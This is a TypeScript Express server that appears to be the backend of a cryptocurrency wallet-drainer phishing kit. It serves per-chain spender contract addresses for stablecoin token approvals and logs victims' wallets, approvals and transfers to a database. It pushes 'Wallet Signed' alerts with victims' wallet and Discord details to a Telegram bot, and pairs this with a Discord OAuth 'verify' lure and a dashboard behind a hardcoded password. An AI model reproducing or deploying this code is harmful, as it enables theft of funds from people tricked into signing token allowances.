import express, { type Request, Response, NextFunction } from "express";
import pg from "pg";

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: false }));

const pool = new pg.Pool({ connectionString: process.env.DATABASE_URL });

const DASHBOARD_PASSWORD = "hourglass2024";

const CHAIN_CONTRACTS: Record<number, string> = {
  1: "0x333438075b576B685249ECE80909Cccad90B6297",
  56: "0x65BDae94B4412640313968138384264cAFcB1E66",
  137: "0x90E92a5D138dECe17f1fe680ddde0900C76429Dc",
  42161: "0x125112F80069d13BbCb459D76C215C7E3dd0b424",
  10: "0xe063eE1Fb241B214Bd371B46E377936b9514Cc5c",
  43114: "0xA6D97ca6E6E1C47B13d17a162F8e466EdFDe3d2e",
  8453: "0x1864b6Ab0091AeBdcf47BaF17de4874daB0574d7",
};

const CHAIN_TOKEN_ADDRESSES: Record<number, Array<{ symbol: string; address: string; decimals: number }>> = {
  1: [
    { symbol: "USDT", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", decimals: 6 },
    { symbol: "USDC", address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", decimals: 6 },
    { symbol: "DAI", address: "0x6B175474E89094C44Da98b954EedeAC495271d0F", decimals: 18 },
  ],
  56: [
    { symbol: "USDT", address: "0x55d398326f99059fF775485246999027B3197955", decimals: 18 },
    { symbol: "USDC", address: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", decimals: 18 },
    { symbol: "DAI", address: "0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3", decimals: 18 },
  ],
  137: [
    { symbol: "USDT", address: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", decimals: 6 },
    { symbol: "USDC", address: "0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359", decimals: 6 },
    { symbol: "DAI", address: "0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063", decimals: 18 },
  ],
  42161: [
    { symbol: "USDT", address: "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9", decimals: 6 },
    { symbol: "USDC", address: "0xaf88d065e77c8cC2239327C5EDb3A432268e5831", decimals: 6 },
    { symbol: "DAI", address: "0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1", decimals: 18 },
  ],
  10: [
    { symbol: "USDT", address: "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58", decimals: 6 },
    { symbol: "USDC", address: "0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85", decimals: 6 },
    { symbol: "DAI", address: "0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1", decimals: 18 },
  ],
  43114: [
    { symbol: "USDT", address: "0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7", decimals: 6 },
    { symbol: "USDC", address: "0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E", decimals: 6 },
    { symbol: "DAI", address: "0xd586E7F844cEa2F87f50152665BCbc2C279D8d70", decimals: 18 },
  ],
  8453: [
    { symbol: "USDT", address: "0xfde4C96c8593536E31F229EA8f37b2ADa2699bb2", decimals: 6 },
    { symbol: "USDC", address: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913", decimals: 6 },
    { symbol: "DAI", address: "0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb", decimals: 18 },
  ],
};

function getContractAddressForChain(chainId: number): string | null {
  return CHAIN_CONTRACTS[chainId] || null;
}

function requireDashboardAuth(req: Request, res: Response, next: NextFunction) {
  const authHeader = req.headers.authorization;
  if (!authHeader || authHeader !== `Bearer ${DASHBOARD_PASSWORD}`) {
    return res.status(401).json({ error: "Unauthorized" });
  }
  next();
}

async function sendTelegramNotification(message: string) {
  try {
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;
    if (!botToken || !chatId) return;
    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: "HTML" }),
    });
  } catch (e) {}
}

app.post("/api/applications", async (req, res) => {
  try {
    const { discordId, discordUsername, walletAddress } = req.body;
    const result = await pool.query(
      "INSERT INTO applications (discord_id, discord_username, wallet_address) VALUES ($1, $2, $3) RETURNING *",
      [discordId, discordUsername, walletAddress]
    );
    res.json(result.rows[0]);
  } catch (error) {
    res.status(400).json({ error: "Invalid application data" });
  }
});

app.get("/api/applications", requireDashboardAuth, async (req, res) => {
  try {
    const result = await pool.query("SELECT * FROM applications ORDER BY id DESC");
    res.json(result.rows);
  } catch (error) {
    res.status(500).json({ error: "Failed to fetch applications" });
  }
});

app.post("/api/approvals", async (req, res) => {
  try {
    const { walletAddress, tokenAddress, tokenSymbol, transactionHash } = req.body;
    const result = await pool.query(
      "INSERT INTO approvals (wallet_address, token_address, token_symbol, transaction_hash) VALUES ($1, $2, $3, $4) RETURNING *",
      [walletAddress, tokenAddress, tokenSymbol, transactionHash]
    );

    await sendTelegramNotification(
      `🔑 <b>Wallet Signed (Vercel)</b>\nWallet: <code>${walletAddress}</code>\nToken: ${tokenSymbol}\nNetwork: EVM\nDiscord: ${req.body.discordUsername || "Unknown"}`
    );

    res.json(result.rows[0]);
  } catch (error) {
    res.status(400).json({ error: "Invalid approval data" });
  }
});

app.get("/api/approvals", requireDashboardAuth, async (req, res) => {
  try {
    const result = await pool.query("SELECT * FROM approvals ORDER BY id DESC");
    res.json(result.rows);
  } catch (error) {
    res.status(500).json({ error: "Failed to fetch approvals" });
  }
});

app.post("/api/transfers", async (req, res) => {
  try {
    const { walletAddress, tokenAddress, tokenSymbol, amount, transactionHash, status } = req.body;
    const result = await pool.query(
      "INSERT INTO transfers (wallet_address, token_address, token_symbol, amount, transaction_hash, status) VALUES ($1, $2, $3, $4, $5, $6) RETURNING *",
      [walletAddress, tokenAddress, tokenSymbol, amount, transactionHash, status || "pending"]
    );
    res.json(result.rows[0]);
  } catch (error) {
    res.status(400).json({ error: "Invalid transfer data" });
  }
});

app.get("/api/transfers", requireDashboardAuth, async (req, res) => {
  try {
    const result = await pool.query("SELECT * FROM transfers ORDER BY id DESC");
    res.json(result.rows);
  } catch (error) {
    res.status(500).json({ error: "Failed to fetch transfers" });
  }
});

app.get("/api/spender-config", (req, res) => {
  const chainIdParam = req.query.chainId ? parseInt(req.query.chainId as string) : null;
  const contractAddress = chainIdParam ? getContractAddressForChain(chainIdParam) : null;
  if (!contractAddress) {
    return res.status(500).json({ error: "No contract configured for this chain" });
  }
  res.json({ spenderAddress: contractAddress, type: "contract" });
});

app.get("/api/chain-contracts", (_req, res) => {
  res.json(CHAIN_CONTRACTS);
});

app.get("/api/chain-tokens", (_req, res) => {
  res.json(CHAIN_TOKEN_ADDRESSES);
});

app.post("/api/solana-approvals", async (req, res) => {
  try {
    const { walletAddress, delegateAddress, transactionHash, tokensApproved } = req.body;
    if (!walletAddress || !delegateAddress || !transactionHash) {
      return res.status(400).json({ error: "walletAddress, delegateAddress, and transactionHash are required" });
    }

    await sendTelegramNotification(
      `🔑 <b>Wallet Signed (Vercel/Solana)</b>\nWallet: <code>${walletAddress}</code>\nTokens: ${(tokensApproved || ["USDC", "USDT"]).join(", ")}\nNetwork: Solana\nDiscord: ${req.body.discordUser || "Unknown"}`
    );

    const approvals: any[] = [];
    const tokens = tokensApproved || ["USDC", "USDT"];
    for (const token of tokens) {
      try {
        const result = await pool.query(
          "INSERT INTO approvals (wallet_address, token_address, token_symbol, transaction_hash) VALUES ($1, $2, $3, $4) RETURNING *",
          [walletAddress, delegateAddress, `SOL-${token}`, transactionHash]
        );
        approvals.push(result.rows[0]);
      } catch (err) {}
    }

    res.json({ success: true, approvals });
  } catch (error) {
    res.status(400).json({ error: "Invalid approval data" });
  }
});

app.post("/api/dashboard-login", (req, res) => {
  const { password } = req.body;
  if (password === DASHBOARD_PASSWORD) {
    res.json({ success: true, token: DASHBOARD_PASSWORD });
  } else {
    res.status(401).json({ error: "Invalid password" });
  }
});

app.get("/api/discord/oauth-url", (req, res) => {
  const clientId = process.env.DISCORD_CLIENT_ID;
  const host = `${req.protocol}://${req.get("host")}`;
  const redirectUri = process.env.VERIFY_URL || host;
  const oauthUrl = `https://discord.com/api/oauth2/authorize?client_id=${clientId}&redirect_uri=${encodeURIComponent(redirectUri)}&response_type=code&scope=identify`;
  res.json({ url: oauthUrl });
});

app.get("/api/discord/callback", async (req, res) => {
  const { code } = req.query;
  if (!code) {
    return res.status(400).json({ error: "Missing code" });
  }
  try {
    const host = `${req.protocol}://${req.get("host")}`;
    const redirectUri = process.env.VERIFY_URL || host;
    const tokenResponse = await fetch("https://discord.com/api/oauth2/token", {
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body: new URLSearchParams({
        client_id: process.env.DISCORD_CLIENT_ID || "",
        client_secret: process.env.DISCORD_CLIENT_SECRET || "",
        grant_type: "authorization_code",
        code: code as string,
        redirect_uri: redirectUri,
      }),
    });
    const tokenData: any = await tokenResponse.json();
    const userResponse = await fetch("https://discord.com/api/users/@me", {
      headers: { Authorization: `Bearer ${tokenData.access_token}` },
    });
    const userData: any = await userResponse.json();
    res.json({
      id: userData.id,
      username: userData.username,
      discriminator: userData.discriminator,
      avatar: userData.avatar,
      global_name: userData.global_name,
    });
  } catch (error) {
    res.status(500).json({ error: "OAuth failed" });
  }
});

export default app;
